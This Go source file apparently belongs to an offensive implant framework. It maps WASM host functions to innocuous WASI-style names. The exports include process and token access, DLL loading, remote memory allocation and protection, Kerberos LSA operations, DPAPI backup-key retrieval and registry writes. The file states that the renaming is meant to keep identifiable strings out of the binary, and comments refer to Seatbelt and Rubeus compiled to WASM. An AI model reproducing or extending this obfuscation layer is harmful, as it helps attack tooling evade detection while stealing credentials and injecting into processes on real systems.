// Package names provides the single source of truth for WASM module and
// export names used by both the host registration and guest compiler.
// Using neutral, WASI-style names avoids embedding identifiable strings
// in the host binary's PE .rdata section and gopclntab function table.
package names

// ModuleName is the WASM host module name. "env" is the standard convention
// used by emscripten, TinyGo, and other WASM toolchains.
const ModuleName = "env"

// Exports maps original (source-level) export names to their anonymized
// equivalents. The host module registers functions under the new names,
// and the compiler rewrites guest-side //go:wasmimport directives to match.
var Exports = map[string]string{
	// ── Networking ──────────────────────────────────────────────
	"sock_open":        "fd_open",
	"sock_bind":        "fd_bind",
	"sock_listen":      "fd_listen",
	"sock_connect":     "fd_connect",
	"sock_accept":      "fd_accept",
	"sock_read":        "fd_read2",
	"sock_write":       "fd_write2",
	"sock_close":       "fd_close2",
	"sock_sendto":      "fd_sendto",
	"sock_recvfrom":    "fd_recvfrom",
	"sock_shutdown":    "fd_shutdown",
	"sock_setsockopt":  "fd_setsockopt",
	"sock_getsockopt":  "fd_getsockopt",
	"sock_getpeername": "fd_getpeername",
	"sock_getsockname": "fd_getsockname",
	"sock_getaddrinfo": "addr_resolve",

	// ── Raw sockets ────────────────────────────────────────────
	"raw_sock_open": "fd_raw_open",
	"raw_sock_send": "fd_raw_send",
	"raw_sock_recv": "fd_raw_recv",

	// ── OS proxies ─────────────────────────────────────────────
	"os_hostname":      "sys_hostname",
	"os_getwd":         "sys_getwd",
	"os_chdir":         "sys_chdir",
	"os_user_current":  "sys_user",
	"os_getpid":        "sys_pid",
	"os_process_list":  "sys_procs",
	"os_exec":          "proc_exec",
	"os_start_process": "proc_start",
	"os_wait4":         "proc_wait",
	"net_interfaces":   "sys_netifs",

	// ── Pipes ──────────────────────────────────────────────────
	"os_pipe":     "fd_pipe",
	"pipe_read":   "fd_pread",
	"pipe_write":  "fd_pwrite",
	"pipe_close":  "fd_pclose",

	// ── Module / DLL ───────────────────────────────────────────
	"win32_available":        "mod_available",
	"win32_load_library":     "mod_load",
	"win32_get_proc_address": "mod_resolve",
	"win32_call":             "mod_call",
	"win32_syscalln":         "mod_invoke",
	"win32_free_library":     "mod_free",
	"win32_close_handle":     "mod_close",
	"win32_register_funcptr": "mod_regptr",
	"win32_host_read_bytes":  "mod_hread",
	// os_list_named_pipes/os_enum_printers/os_enum_sec_packages/
	// os_enum_user_right_assignments/os_enum_wifi_profiles removed —
	// WASM-side via wf_call (fs_pipes) or stub-empty (Phase B).

	// ── Registry ───────────────────────────────────────────────
	// win32_reg_open_key / win32_reg_close_key removed — WASM-side via wf_call (Phase B)
	"win32_reg_query_value":  "reg_query",
	"win32_reg_set_value":    "reg_set",
	"win32_reg_delete_value": "reg_delete",
	// win32_reg_enum_key removed — WASM-side via wf_call (Phase B)
	// win32_reg_enum_values removed 2026-06-08 — Seatbelt.wasm + Rubeus.wasm
	// resolve reg_enumvals locally via pinvoke_env_ext.c wf_call chains.

	// ── Filesystem ─────────────────────────────────────────────
	"win32_create_file":    "fs_create",
	"win32_read_file":      "fs_read",
	"win32_write_file":     "fs_write",
	"win32_get_file_attrs": "fs_getattr",
	"win32_set_file_attrs": "fs_setattr",
	"win32_find_files":     "fs_findfiles",

	// ── Process ────────────────────────────────────────────────
	"win32_get_computer_name":  "sys_compname",
	"win32_create_process":     "proc_create",
	"win32_open_process":       "proc_open",
	"win32_terminate_process":  "proc_term",

	// ── Security / tokens ──────────────────────────────────────
	"win32_open_process_token":   "sec_opentoken",
	"win32_get_token_info":       "sec_tokeninfo",
	"win32_open_sc_manager":      "svc_open",
	"win32_query_service_status": "svc_status",
	// win32_parse_sddl_acl removed — WASM-side passthrough (Phase B)
	// win32_get_sddl removed — WASM-side via wf_call (Phase B)
	// win32_enum_user_rights / win32_enum_logon_sessions removed — WASM-side stubs (Phase B)
	"win32_lsa_kerberos_op":       "lsa_kerbop",
	"win32_crypto_op":             "xc_op",
	"win32_io_op":                 "xi_op",
	"win32_reg_search":            "reg_search",
	"win32_dpapi_backupkey":       "dpapi_bkey",
	"win32_x509_match":            "x509_match",
	// win32_enum_rpc_endpoints removed — WASM-side stub (Phase B)
	// win32_wmi_query / win32_wmi_method removed — WASM-side stubs (Phase B)
	"win32_wmi_query_restricted": "wmi_query_r", // host-side path for restricted WMI namespaces
	// win32_enum_network_adapters removed — WASM-side via wf_call (Phase B)
	// win32_get_file_version_info removed — WASM-side via wf_call (Phase B)
	// win32_enum_reg_values removed — WASM-side wf_call(advapi32) Phase B
	// win32_pbkdf2_sha1/256/512 removed — WASM-side via wf_call(bcrypt.dll) Phase B
	// win32_hmac_sha1/256/512 removed — WASM-side via wf_call (Phase B)
	"win32_proc_modules_enum":      "proc_modules_all",
	// win32_aes_cbc_decrypt removed — WASM-side via wf_call(bcrypt.dll) Phase B
	// win32_sha1/win32_sha256 removed — implemented WASM-side via wf_call (Phase B)
	"win32_ldap_modify":            "net_ldapmodify",
	// os_list_dir/os_file_exists/os_read_all removed — WASM-side via wf_call (Phase B)
	// win32_check_modifiable_key / win32_check_modifiable_service removed — Phase B WASM-side wf_call chains
	// win32_enum_process_modules removed — WASM-side via wf_call (Phase B)

	// ── Host memory ────────────────────────────────────────────
	"win32_virtual_alloc":   "mem_alloc",
	"win32_virtual_protect": "mem_protect",
	"win32_virtual_free":    "mem_free",
	"win32_hmem_write":      "mem_write",
	"win32_hmem_read":       "mem_read",
	"win32_hmem_write32":    "mem_write32",
	"win32_hmem_write64":    "mem_write64",
	"win32_hmem_read32":     "mem_read32",
	"win32_hmem_read64":     "mem_read64",
	"win32_hmem_addr":       "mem_addr",
	"win32_proc_from_hmem":  "mem_proc",
	"win32_proc_addr":       "mod_addr",

	// ── Extension API ──────────────────────────────────────────
	"win32_ext_get_func":     "ext_getfunc",
	"win32_ext_read_output":  "ext_readout",
	"win32_ext_reset_output": "ext_resetout",
	"win32_new_callback":     "ext_callback",

	// ── Shadow memory ──────────────────────────────────────────
	"shadow_virtual_alloc":   "shm_alloc",
	"shadow_virtual_protect": "shm_protect",
	"shadow_virtual_free":    "shm_free",

	// ── Darwin / macOS frameworks ─────────────────────────────
	"darwin_available":  "fw_available",
	"darwin_load":       "fw_load",
	"darwin_get_symbol": "fw_sym",
	"darwin_call":        "fw_call",
	"darwin_call_masked": "fw_call_m",
	"darwin_call_raw":    "fw_call_raw",
	"darwin_mem_read":   "fw_mem_r",
	"darwin_mem_write":  "fw_mem_w",

	// ── Darwin / callbacks ───────────────────────────────────
	"darwin_callback_create": "fw_cb_create",
	"darwin_callback_addr":   "fw_cb_addr",
	"darwin_callback_wait":   "fw_cb_wait",
	"darwin_callback_return": "fw_cb_ret",
	"darwin_callback_free":   "fw_cb_free",
	"darwin_read_cstring":    "fw_cstr_r",
	"darwin_block_create":    "fw_blk_create",
	"darwin_block_release":   "fw_blk_release",
	"darwin_block_addr":      "fw_blk_addr",
}

// Reverse builds an inverted map (new name → old name) for compiler lookups.
func Reverse() map[string]string {
	r := make(map[string]string, len(Exports))
	for old, new_ := range Exports {
		r[new_] = old
	}
	return r
}
